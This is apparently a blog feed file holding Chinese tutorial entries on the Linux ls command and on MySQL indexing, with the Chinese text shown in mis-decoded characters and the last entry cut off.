      <title>Linuxå°æŠ€å·§ä¹‹ls</title>
      <link href="/2022/02/09/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bls/"/>
      <url>/2022/02/09/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bls/</url>
      
        <content type="html"><![CDATA[<p>ls å‘½ä»¤çš„å«ä¹‰æ˜¯listæ˜¾ç¤ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶åå­—ã€‚æ³¨æ„ä¸åŠ å‚æ•°å®ƒæ˜¾ç¤ºé™¤éšè—æ–‡ä»¶å¤–çš„æ‰€æœ‰æ–‡ä»¶åŠç›®å½•çš„åå­—ã€‚<br>â€‹</p><p>â€‹<strong>1ï¼‰ls â€“a æ˜¾ç¤ºå½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…å«éšè—æ–‡ä»¶</strong><br>å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -a</span><br></pre></td></tr></table></figure><p>â€‹</p><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -a</span><br><span class="line">.                  lantern-installer-beta.apk                Zombiesrunfree.apk</span><br><span class="line">..                 lantern-installer-beta.zip                ç…§ç‰‡èµ„æ–™</span><br><span class="line">1.07.apk           PokÃ©mon.GO_com.nianticlabs.pokemongo.apk  è½¯ä»¶ä¸‹è½½</span><br><span class="line">com_pokemongo.apk  Psiphon3.apk                              é‚®ä»¶é™„ä»¶ä¸‹è½½</span><br><span class="line">Green.apk          yxzx.apk                                  é›é¹°æ—¥å¿—</span><br></pre></td></tr></table></figure><p>psï¼šéšè—æ–‡ä»¶æ˜¯åœ¨æ–‡ä»¶åå­—ä»¥â€œ.â€ï¼ˆè‹±æ–‡å¥å·ï¼‰å¼€å¤´çš„æ–‡ä»¶<br><strong>2ï¼‰ls â€“l æ˜¾ç¤ºæ–‡ä»¶åŠå…¶è¯¦ç»†ä¿¡æ¯</strong><br>å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -l</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">aijian.shi@U-aijian-shi:~/Downloads$ ls -l</span><br><span class="line">total 207440</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  6023990 Aug  9 15:53 1.07.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 62823571 Aug  9 16:43 com_pokemongo.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  7193125 Aug  9 16:05 Green.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  5406068 Mar 23 21:31 lantern-installer-beta.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  4572221 Aug  8 19:16 lantern-installer-beta.zip</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 62823571 Aug  8 15:28 PokÃ©mon.GO_com.nianticlabs.pokemongo.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  6447294 Aug  9 16:15 Psiphon3.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  9789834 Aug  9 19:39 yxzx.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 47297545 Aug  9 19:50 Zombiesrunfree.apk</span><br><span class="line">drwxr-xr-x 2 aijian.shi tdsw1     4096 Aug  1 14:58 ç…§ç‰‡èµ„æ–™</span><br><span class="line">drwxr-xr-x 3 aijian.shi tdsw1     4096 Aug  3 14:56 è½¯ä»¶ä¸‹è½½</span><br><span class="line">drwxr-xr-x 4 aijian.shi tdsw1     4096 Aug  5 13:16 é‚®ä»¶é™„ä»¶ä¸‹è½½</span><br><span class="line">drwxr-xr-x 2 aijian.shi tdsw1     4096 Aug  3 16:17 é›é¹°æ—¥å¿—</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œtotal 207440è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤§å°æ€»å’Œä¸º207440Kã€‚<br>ä»¥æœ€åä¸€è¡Œè¾“å‡ºä¸ºä¾‹ï¼Œ<br>drwxr-xr-x ç¬¬ä¸€ä¸ªå­—ç¬¦æœ‰3ç§æƒ…å†µï¼šâ€œ-â€è¡¨ç¤ºæ™®é€šæ–‡ä»¶ï¼Œâ€œdâ€ä»£è¡¨ç›®å½•ï¼Œâ€œlâ€ä»£è¡¨è¿æ¥æ–‡ä»¶ï¼Œâ€œbâ€ä»£è¡¨è®¾å¤‡æ–‡ä»¶ã€‚æ˜¾ç„¶æœ€åçš„â€œé›é¹°æ—¥å¿—â€æ˜¯ä¸€ä¸ªç›®å½•æ–‡ä»¶ã€‚<br>åé¢çš„9ä¸ªå­—ç¬¦æ¯3ä¸ªä¸ºä¸€ç»„ï¼Œåˆ†åˆ«ä»£è¡¨æ–‡ä»¶æ‰€æœ‰è€…ã€æ–‡ä»¶æ‰€æœ‰è€…æ‰€åœ¨ç”¨æˆ·ç»„ã€å…¶å®ƒç”¨æˆ·å¯¹æ–‡ä»¶æ‹¥æœ‰çš„æƒé™ã€‚æ¯ç»„ä¸­â€œrâ€ã€â€œwâ€ã€â€œxâ€ä¸‰ä¸ªå­—ç¬¦åˆ†åˆ«ä»£è¡¨è¯»ã€å†™ã€æ‰§è¡Œçš„æƒé™ï¼Œè‹¥æ²¡æœ‰å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæƒé™åˆ™ç”¨â€œ-â€è¡¨ç¤ºã€‚æ‰§è¡Œçš„æƒé™æœ‰ä¸¤ä¸ªå­—ç¬¦å¯é€‰ï¼Œæœ€å¸¸è§çš„ä¸€ä¸ªæ˜¯â€œxâ€ä»£è¡¨å¯æ‰§è¡Œï¼Œå¦ä¸€ä¸ªæ˜¯â€œsâ€ä»£è¡¨å¥—æ¥å£æ–‡ä»¶ã€‚<br>ç´§æ¥ç€çš„æ•°å­—â€œ2â€ä»£è¡¨ â€œé›é¹°æ—¥å¿—â€è¿™ä¸ªç›®å½•ä¸‹çš„ç›®å½•æ–‡ä»¶æ•°ç›®ï¼ˆè¿™ä¸ªæ•°ç›®=éšè—ç›®å½•æ•°ç›®+æ™®é€šç›®å½•æ•°ç›®ï¼‰ã€‚ï¼ˆå¦‚æœè¿™åªæ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œé‚£â€œ2â€å°±ä»£è¡¨è¿™ä¸ªæ–‡ä»¶æœ‰ä¸¤ä¸ªåˆ«åï¼Œè¿™ä¸ªæ–‡ä»¶è¢«äººåˆ›å»ºäº†ä¸€ä¸ªç¡¬é“¾æ¥æ–‡ä»¶ï¼‰<br>åé¢çš„aijian.shiä»£è¡¨è¿™ä¸ªæ–‡ä»¶ï¼ˆç›®å½•ï¼‰çš„å±ä¸»ï¼ˆOwnerï¼‰ä¸ºç”¨æˆ·aijian.shi<br>å†æ¥ä¸‹æ¥çš„tdsw1ä»£è¡¨è¿™ä¸ªæ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ‰€å±çš„ç”¨æˆ·ç»„ï¼ˆGroupï¼‰ä¸ºç»„tdsw1ï¼ˆæœ¬äººè½¯ä»¶ç»„ï¼‰<br>4096 ä»£è¡¨æ–‡ä»¶çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰ï¼Œç›®å½•çš„å¤§å°æ€»æ˜¯ä¸º4096å­—èŠ‚ã€‚<br>Aug   3   16ï¼š17ä»£è¡¨æ–‡ä»¶ï¼ˆç›®å½•ï¼‰çš„ä¿®æ”¹æ—¶é—´ã€‚<br>â€œé›é¹°æ—¥å¿—â€œä»£è¡¨æ–‡ä»¶ï¼ˆç›®å½•ï¼‰åœ¨åå­—ã€‚<br>â€‹</p><p><strong>3ï¼‰æ–‡ä»¶åé¢œè‰²çš„å«ä¹‰</strong><br>é»˜è®¤è‰²ä»£è¡¨æ™®é€šæ–‡ä»¶ã€‚ä¾‹ï¼šinstall.log<br>ç»¿è‰²ä»£è¡¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹ï¼šrc.news<br>çº¢è‰²ä»£è¡¨taråŒ…æ–‡ä»¶ã€‚    ä¾‹ï¼švim-7.1.tar.bz2<br>â€‹è“è‰²ä»£è¡¨ç›®å½•æ–‡ä»¶ã€‚   ä¾‹ï¼šaa<br>â€‹æ°´çº¢ä»£è¡¨å›¾è±¡æ–‡ä»¶ã€‚   ä¾‹ï¼šSunset.jpg<br>â€‹é’è‰²ä»£è¡¨é“¾æ¥æ–‡ä»¶ã€‚   ä¾‹ï¼šrc4.d  ï¼ˆæ­¤ç±»æ–‡ä»¶ç›¸å½“äºå¿«æ·æ–¹å¼ï¼‰<br>â€‹é»„è‰²ä»£è¡¨è®¾å¤‡æ–‡ä»¶ã€‚   ä¾‹ï¼šfd0<br>psï¼šè®¾ç½®æ˜¾ç¤ºå½©è‰²ç›®å½•åˆ—è¡¨æ–¹æ³•<br>æ‰“å¼€/etc/bashrc, åŠ å…¥å¦‚ä¸‹ä¸€è¡Œ:<br>alias ls=â€ls â€“colorâ€<br>ä¸‹æ¬¡å¯åŠ¨bashæ—¶å°±å¯ä»¥åƒåœ¨Slackwareé‡Œé‚£æ ·æ˜¾ç¤ºå½©è‰²çš„ç›®å½•åˆ—è¡¨äº†, å…¶ä¸­é¢œè‰²çš„å«ä¹‰å¦‚ä¸‹:</p><ol><li>è“è‰²â€“&gt;ç›®å½•</li><li>ç»¿è‰²â€“&gt;å¯æ‰§è¡Œæ–‡ä»¶</li><li>çº¢è‰²â€“&gt;å‹ç¼©æ–‡ä»¶</li><li>æµ…è“è‰²â€“&gt;é“¾æ¥æ–‡ä»¶</li><li>ç°è‰²â€“&gt;å…¶ä»–æ–‡ä»¶<br>â€‹</li></ol><p><strong>4ï¼‰å‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„æŒ‡ä»¤å’Œå‚æ•°ã€‚</strong><br>â€‹</p><p>åªåˆ—å‡ºå­ç›®å½•</p><ol><li>ls -F | grep /$ æˆ–è€… alias sub = â€œls -F | grep /$â€(linux)</li><li>ls -l | grep â€œ^dâ€ æˆ–è€… ls -lL | grep â€œ^dâ€ (Solaris)<br>è®¡ç®—å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶æ•°å’Œç›®å½•æ•°<br>ä¸‹é¢å‘½ä»¤å¯ä»¥åˆ†åˆ«è®¡ç®—å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ä¸ªæ•°ï¼š<h1 id="ls-l-grep-â€œ-â€œ-wc-l-â€”-to-count-files"><a href="#ls-l-grep-â€œ-â€œ-wc-l-â€”-to-count-files" class="headerlink" title="ls -l * |grep â€œ^-â€œ|wc -l â€”- to count files"></a>ls -l * |grep â€œ^-â€œ|wc -l â€”- to count files</h1><h1 id="ls-l-grep-â€œ-dâ€-wc-l-â€”â€“-to-count-dir"><a href="#ls-l-grep-â€œ-dâ€-wc-l-â€”â€“-to-count-dir" class="headerlink" title="ls -l * |grep â€œ^dâ€|wc -l â€”â€“ to count dir"></a>ls -l * |grep â€œ^dâ€|wc -l â€”â€“ to count dir</h1>â€‹</li></ol><p>-tæŒ‰æœ€åä¿®æ”¹æ—¶é—´æ’åºã€‚<br>-SæŒ‰æ–‡ä»¶å¤§å°æ’åºã€‚ï¼ˆå¤§å†™çš„Sï¼‰<br>-ræ’åºæ—¶æŒ‰å€’åºã€‚<br>-hæ˜¾ç¤ºæ–‡ä»¶å¤§å°æ—¶å¢åŠ å¯è¯»æ€§ï¼ˆä¾‹ï¼š1K 234M 2Gï¼‰<br>â€‹</p><p>â€‹</p><p><strong>5ï¼‰å…¶ä»–</strong><br>-a åˆ—å‡ºç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥ . å¼€å¤´çš„éšå«æ–‡ä»¶ã€‚<br>-b æŠŠæ–‡ä»¶åä¸­ä¸å¯è¾“å‡ºçš„å­—ç¬¦ç”¨åæ–œæ åŠ å­—ç¬¦ç¼–å·(å°±è±¡åœ¨Cè¯­è¨€é‡Œä¸€æ ·)çš„å½¢å¼åˆ—å‡ºã€‚<br>-c è¾“å‡ºæ–‡ä»¶çš„ i èŠ‚ç‚¹çš„ä¿®æ”¹æ—¶é—´ï¼Œå¹¶ä»¥æ­¤æ’åºã€‚<br>-d å°†ç›®å½•è±¡æ–‡ä»¶ä¸€æ ·æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºå…¶ä¸‹çš„æ–‡ä»¶ã€‚<br>-e è¾“å‡ºæ—¶é—´çš„å…¨éƒ¨ä¿¡æ¯ï¼Œè€Œä¸æ˜¯è¾“å‡ºç®€ç•¥ä¿¡æ¯ã€‚<br>-f -U å¯¹è¾“å‡ºçš„æ–‡ä»¶ä¸æ’åºã€‚<br>-g æ— ç”¨ã€‚<br>-i è¾“å‡ºæ–‡ä»¶çš„ i èŠ‚ç‚¹çš„ç´¢å¼•ä¿¡æ¯ã€‚<br>-k ä»¥ k å­—èŠ‚çš„å½¢å¼è¡¨ç¤ºæ–‡ä»¶çš„å¤§å°ã€‚<br>-l åˆ—å‡ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>-m æ¨ªå‘è¾“å‡ºæ–‡ä»¶åï¼Œå¹¶ä»¥â€œï¼Œâ€ä½œåˆ†æ ¼ç¬¦ã€‚<br>-n ç”¨æ•°å­—çš„ UID,GID ä»£æ›¿åç§°ã€‚<br>-o æ˜¾ç¤ºæ–‡ä»¶çš„é™¤ç»„ä¿¡æ¯å¤–çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>-p -F åœ¨æ¯ä¸ªæ–‡ä»¶ååé™„ä¸Šä¸€ä¸ªå­—ç¬¦ä»¥è¯´æ˜è¯¥æ–‡ä»¶çš„ç±»å‹ï¼Œâ€œ*â€è¡¨ç¤ºå¯æ‰§è¡Œçš„æ™®é€š<br>æ–‡ä»¶ï¼›â€œ/â€è¡¨ç¤ºç›®å½•ï¼›â€œ@â€è¡¨ç¤ºç¬¦å·é“¾æ¥ï¼›â€œ|â€è¡¨ç¤ºFIFOsï¼›â€œ=â€è¡¨ç¤ºå¥—<br>æ¥å­—(sockets)ã€‚<br>-q ç”¨?ä»£æ›¿ä¸å¯è¾“å‡ºçš„å­—ç¬¦ã€‚<br>-r å¯¹ç›®å½•åå‘æ’åºã€‚<br>-s åœ¨æ¯ä¸ªæ–‡ä»¶ååè¾“å‡ºè¯¥æ–‡ä»¶çš„å¤§å°ã€‚<br>-t ä»¥æ—¶é—´æ’åºã€‚<br>-u ä»¥æ–‡ä»¶ä¸Šæ¬¡è¢«è®¿é—®çš„æ—¶é—´æ’åºã€‚<br>-x æŒ‰åˆ—è¾“å‡ºï¼Œæ¨ªå‘æ’åºã€‚<br>-A æ˜¾ç¤ºé™¤ â€œ.â€å’Œâ€œ..â€å¤–çš„æ‰€æœ‰æ–‡ä»¶ã€‚<br>-B ä¸è¾“å‡ºä»¥ â€œ~â€ç»“å°¾çš„å¤‡ä»½æ–‡ä»¶ã€‚<br>-C æŒ‰åˆ—è¾“å‡ºï¼Œçºµå‘æ’åºã€‚<br>-G è¾“å‡ºæ–‡ä»¶çš„ç»„çš„ä¿¡æ¯ã€‚<br>-L åˆ—å‡ºé“¾æ¥æ–‡ä»¶åè€Œä¸æ˜¯é“¾æ¥åˆ°çš„æ–‡ä»¶ã€‚<br>-N ä¸é™åˆ¶æ–‡ä»¶é•¿åº¦ã€‚<br>-Q æŠŠè¾“å‡ºçš„æ–‡ä»¶åç”¨åŒå¼•å·æ‹¬èµ·æ¥ã€‚<br>-R åˆ—å‡ºæ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚<br>-S ä»¥æ–‡ä»¶å¤§å°æ’åºã€‚<br>-X ä»¥æ–‡ä»¶çš„æ‰©å±•å(æœ€åä¸€ä¸ª . åçš„å­—ç¬¦)æ’åºã€‚<br>-1 ä¸€è¡Œåªè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br>â€“color=no ä¸æ˜¾ç¤ºå½©è‰²æ–‡ä»¶å<br>â€“help åœ¨æ ‡å‡†è¾“å‡ºä¸Šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚<br>â€“version åœ¨æ ‡å‡†è¾“å‡ºä¸Šè¾“å‡ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚</p><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/aijianshi/p/5756346.html">https://www.cnblogs.com/aijianshi/p/5756346.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLçŸ¥è¯†ç‚¹æ¢³ç†s</title>
      <link href="/2022/02/09/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/"/>
      <url>/2022/02/09/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/</url>
      
        <content type="html"><![CDATA[<h2 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h2><p>ç´¢å¼•æ˜¯å¸®åŠ©MySQLé«˜æ•ˆè·å–æ•°æ®çš„æ•°æ®ç»“æ„ï¼Œç®€å•ç†è§£ä¸ºï¼šæ’å¥½åºçš„å¿«é€ŸæŸ¥æ‰¾æ•°æ®ç»“æ„</p><h3 id="å±€éƒ¨æ€§åŸç†"><a href="#å±€éƒ¨æ€§åŸç†" class="headerlink" title="å±€éƒ¨æ€§åŸç†"></a>å±€éƒ¨æ€§åŸç†</h3><p>æ•°æ®å’Œç¨‹åºéƒ½æœ‰èšé›†æˆç¾¤çš„å€¾å‘ï¼Œä¹‹å‰è¢«æŸ¥è¯¢è¿‡çš„æ•°æ®å¾ˆå¯èƒ½å†æ¬¡è¢«å®£è¯¢</p><h3 id="ç£ç›ˆé¢„è¯»"><a href="#ç£ç›ˆé¢„è¯»" class="headerlink" title="ç£ç›ˆé¢„è¯»"></a>ç£ç›ˆé¢„è¯»</h3><p>åœ¨ç£ç›˜è·Ÿå†…å­˜è¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªæœ€å°çš„é€»è¾‘å•å…ƒï¼Œç§°ä¹‹ä¸ºé¡µï¼Œdatapageï¼Œé¡µè·Ÿæ“ä½œç³»ç»Ÿ ç›¸å…³ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯4kæˆ–è€…8kï¼Œæ¯æ¬¡åœ¨è¿›è¡Œæ•°æ®äº¤äº’çš„æ—¶å€™ï¼Œä¸€å®šè¯»å–çš„æ˜¯é¡µçš„å«æ•°å€<br>â€‹</p><p>mysqlçš„innodbåœ¨è¿›è¡Œæ•°æ®è¯»å–çš„æ—¶å€™ä¹Ÿæ˜¯è·Ÿé¡µç›¸å…³çš„ï¼Œdatapagesizeï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯16kb<br>â€‹</p><p>ç´¢å¼•æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸­çš„ï¼Œä½†æ˜¯ä¼šé¢„å…ˆåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œä¸”åœ¨è¿›è¡ŒåŠ è½½çš„æ—¶å€™æ˜¯åˆ†é¡µåŠ è½½</p><h2 id="Bæ ‘å’ŒB-æ ‘"><a href="#Bæ ‘å’ŒB-æ ‘" class="headerlink" title="Bæ ‘å’ŒB+æ ‘"></a>Bæ ‘å’ŒB+æ ‘</h2><p>B+Treeæ˜¯åœ¨BTreeçš„åŸºç¡€ä¹‹ä¸Šåšçš„ä¸€ç§ä¼˜åŒ–ï¼Œå˜åŒ–å¦‚ä¸‹ï¼š</p><ol><li>B+Treeæ¯ä¸ªèŠ‚ç‚¹å¯ä»¥åŒ…å«æ›´å¤šçš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªåŸå› æ˜¯ä¸ºäº†é™ä½æ ‘çš„é«˜åº¦ï¼Œç¬¬äºŒä¸ªåŸå› æ˜¯å°†æ•°æ®èŒƒå›´å˜ä¸ºå¤šä¸ªåŒºé—´ï¼ŒåŒºé—´è¶Šå¤šï¼Œæ•°æ®æ£€ç´¢è¶Šå¿« </li><li>éå¶å­èŠ‚ç‚¹å­˜å‚¨keyï¼Œå¶å­èŠ‚ç‚¹å­˜å‚¨keyå’Œæ•°æ®</li><li>å¶å­èŠ‚ç‚¹ä¸¤ä¸¤æŒ‡é’ˆç›¸äº’è¿æ¥ï¼ˆç¬¦åˆç£ç›˜çš„é¢„è¯»ç‰¹æ€§)ï¼Œé¡ºåºæŸ¥è¯¢æ€§èƒ½æ›´é«˜<h3 id="MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢"><a href="#MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢" class="headerlink" title="MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢"></a>MySQLä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸»é”®è‡ªå¢</h3>å¦‚æœä¸è‡ªå¢å¯èƒ½ä¼šå¯¼è‡´é¡µåˆ†è£‚ï¼Œåˆ†è£‚åä¼šéœ€è¦å¢åŠ çˆ¶èŠ‚ç‚¹å¯¹å­èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå¦‚æœè®¾ç½®æˆè‡ªå¢çš„å°±ä¸éœ€è¦é¡µåˆ†è£‚äº†<h2 id="èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•"><a href="#èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•" class="headerlink" title="èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•"></a>èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•</h2>ç´¢å¼•å’Œæ•°æ®æ”¾åœ¨ä¸€èµ·å°±æ˜¯èšç°‡ç´¢å¼•<br>â€‹</li></ol><p>â€‹</p><p><img src="https://snowgo.top/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/0.png" alt="éèšç°‡ç´¢å¼•" title="éèšç°‡ç´¢å¼•"></p><h3 id="ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ"><a href="#ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ" class="headerlink" title="ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ"></a>ä¸€ä¸ªè¡¨ä¸­å¯ä»¥ç”±å¤šå°‘ä¸ªç´¢å¼•ï¼Ÿ</h3><p>è‚¯å®šä¸æ˜¯åªæœ‰ä¸€ä¸ªç´¢å¼•ï¼Œå¯ä»¥æ ¹æ®ç”¨æˆ·éœ€è¦æ¥åˆ›å»ºç´¢å¼•<br><img src="https://snowgo.top/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/1.png" alt="å†è¯•ä¸€ä¸‹" title="å†è¯•ä¸€ä¸‹"></p><h3 id="å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ"><a href="#å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ" class="headerlink" title="å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ"></a>å¦‚æœä¸€ä¸ªè¡¨ä¸­ç”±3ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆæ•°æ®è¦å­˜å‚¨å‡ ä»½ï¼Ÿ</h3><p>æ³¨æ„ï¼Œä¸€ä¸ªè¡¨ä¸­æ— è®ºç”±å¤šå°‘ç´¢å¼•ï¼Œæ•°æ®åªå­˜å‚¨ä¸€ä»½ </p><h3 id="å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ"><a href="#å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ"></a>å¦‚æœæ•°æ®åªå­˜å‚¨ä¸€ä»½çš„è¯ï¼Œé‚£ä¹ˆå…¶ä»–çš„ç´ å¼•æ€ä¹ˆæ£€ç´ åˆ°æ•°æ®å‘¢ï¼Ÿ</h3><p>å›è¡¨<br>æ•°æ®åœ¨è¿›è¡Œæ’å…¥çš„æ—¶å€™ï¼Œæ˜¯å¿…é¡»è¦è·Ÿç´¢å¼•å­˜å‚¨åœ¨ä¸€èµ·çš„ï¼Œåœ¨innodbçš„å­˜å‚¨å¼•æ“ä¸­ï¼Œå¦‚æœè¡¨ä¸­ç”±ä¸»é”®ï¼Œé‚£ä¹ˆæ•°æ®è·Ÿä¸»é”®æ”¾åœ¨ä¸€èµ·ï¼Œå¦‚æœæ²¡æœ‰ä¸»é”®ï¼Œè·Ÿå”¯ä¸€é”®æ”¾åœ¨ä¸€èµ·ï¼Œå¦‚æœæ²¡æœ‰å”¯ä¸€é”®ï¼Œä¼šç”Ÿæˆä¸€ ä¸ª6å­—èŠ‚çš„rowidï¼Œæ•°æ®è·Ÿrowidæ”¾åœ¨ä¸€èµ·ï¼Œæ— è®ºå¦‚æœï¼Œæ€»æ˜¯éœ€è¦ä¸€ä¸ªç´¢å¼•åˆ—çš„<br><img src="https://snowgo.top/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLçŸ¥è¯†ç‚¹æ¢³ç†</title>
      <link href="/2022/02/08/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/"/>
      <url>/2022/02/08/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h2><p>ç´¢å¼•æ˜¯å¸®åŠ©MySQLé«˜æ•ˆè·å–æ•°æ®çš„æ•°æ®ç»“æ„ï¼Œç®€å•ç†è§£ä¸ºï¼šæ’å¥½åºçš„å¿«é€ŸæŸ¥æ‰¾æ•°æ®ç»“æ„</p><h3 id="å±€éƒ¨æ€§åŸç†"><a href="#å±€éƒ¨æ€§åŸç†" class="headerlink" title="å±€éƒ¨æ€§åŸç†"></a>å±€éƒ¨æ€§åŸç†</h3><p>æ•°æ®å’Œç¨‹åºéƒ½æœ‰èšé›†æˆç¾¤çš„å€¾å‘ï¼Œä¹‹å‰è¢«æŸ¥è¯¢è¿‡çš„æ•°æ®å¾ˆå¯èƒ½å†æ¬¡è¢«å®£è¯¢</p><h3 id="ç£ç›ˆé¢„è¯»"><a href="#ç£ç›ˆé¢„è¯»" class="headerlink" 